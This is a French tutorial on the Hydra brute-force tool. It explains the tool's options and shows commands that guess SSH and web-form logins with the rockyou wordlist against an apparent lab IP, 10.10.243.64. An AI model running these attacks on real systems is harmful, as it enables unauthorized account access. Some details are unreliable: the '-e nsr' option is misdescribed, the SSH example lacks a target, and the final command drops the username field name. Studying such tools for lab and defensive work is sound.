# Les bases de l'outil Hydra

## Introduction

Hydra est un outil puissant de bruteforce de mots de passe en ligne. Il peut être utilisé pour attaquer de nombreux protocoles différents !

## Utilisation

### Syntaxe

```bash
hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SuvVd46] [service://server[:PORT][/OPT]]
```

### Options

TAG | Description
--- | ---
`-l LOGIN` ou `-L FILE` | identifiant ou fichier contenant une liste d'identifiants
`-p PASS` ou `-P FILE` | mot de passe ou fichier contenant une liste de mots de passe
`-C FILE` | fichier contenant des identifiants et des mots de passe séparés par des espaces
`-e nsr` | arrêter sur le premier succès, afficher les réponses négatives, afficher les réponses positives
`-o FILE` | enregistrer les résultats dans le fichier FILE
`-t TASKS` | exécuter TASKS nombre de tâches simultanément (valeur par défaut : 16)
`-M FILE` | serveurs multiples (fichier de liste)
`-T TASKS` | exécuter TASKS nombre de tâches simultanément par serveur (valeur par défaut : 16)
`-w TIME` | délai d'attente pour les réponses (valeur par défaut : 30)
`-W TIME` | délai d'attente global pour les réponses (valeur par défaut : 30)
`-f` | quitter après la première réponse positive
`-s PORT` | si le service est sur un autre port que le port par défaut, spécifiez-le ici
`-x MIN:MAX:CHARSET` | exécuter un bruteforce, avec des longueurs de mot de passe de MIN à MAX avec le jeu de caractères CHARSET
`-S` | connexion SSL
`-u` | connexion TLS
`-vV` | niveau de verbosité, -v : afficher les tentatives, -V : afficher les tentatives et les réponses
`-d` | afficher les informations de débogage
`-4` | force IPv4
`-6` | force IPv6



## Exemples

### SSH

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -vV
```
## Formulaires Web avec Hydra

Nous pouvons également utiliser Hydra pour forcer les formulaires web. Vous devez savoir quel type de requête est effectué ; les méthodes GET ou POST sont couramment utilisées. Vous pouvez utiliser l'onglet réseau de votre navigateur (dans les outils de développement) pour voir les types de requêtes ou afficher le code source.

```bash	
sudo hydra <username> <wordlist> 10.10.243.64 http-post-form "<path>:<login_credentials>:<invalid_response>"
```

Option | Description
--- | ---
`<username>` | le nom d'utilisateur pour la connexion (formulaire web)
`<wordlist>` | liste de mots de passe
`http-post-form`| le type de formulaire est POST
`<path>` | l'URL de la page de connexion, par exemple, `login.php`
`<login_credentials>` | le nom d'utilisateur et le mot de passe utilisés pour se connecter, par exemple, `username=^USER^&password=^PASS^`
`<invalid_response>` | partie de la réponse en cas d'échec de la connexion
`-V` | sortie verbeuse pour chaque tentative

### Exemple pour forcer un formulaire de connexion POST

```bash
hydra -l <username> -P <wordlist> 10.10.243.64 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

* La page de connexion n'est que `/`, c'est-à-dire l'adresse IP principale.
* Le `username` est le champ du formulaire dans lequel le nom d'utilisateur est saisi.
* Le(s) nom(s) d'utilisateur spécifié(s) remplacera(ont) `^USER^`
* Le `password` est le champ du formulaire dans lequel le mot de passe est saisi.
* Enfin,` F=incorrect` est une chaîne qui apparaît dans la réponse du serveur en cas d'échec de la connexion

#### Etape 1 : Trouver le formulaire de connexion

Le mieux est d'utiliser **burpsuite** pour intercepter la requête POST. Vous pouvez également utiliser l'onglet réseau de votre navigateur (dans les outils de développement) pour voir les types de requêtes ou afficher le code source. Avec Burp, ce qui nous intéresse c'est la tête qu'a la requête username+password.

* On lance burpsuite
* On active le proxy et on lance l'intercepter
* On se connecte au site avec un username et un password bidon
* On récupère sur burpsuite la requête envoyée
* On copie la forme de la requête exemple `username=mon&password=test`
* On envoie la requête pour ensuite récupérer le messager d'erreur, exemple : `Your username or password is incorrect.`

#### Etape 2 : Lancer l'attaque avec les infos regroupées

```bash
hydra -l pseudoAtester -P /usr/share/wordlists/rockyou.txt 10.10.243.64 http-post-form "/login:=^USER^&password=^PASS^:Your username or password is incorrect."
```
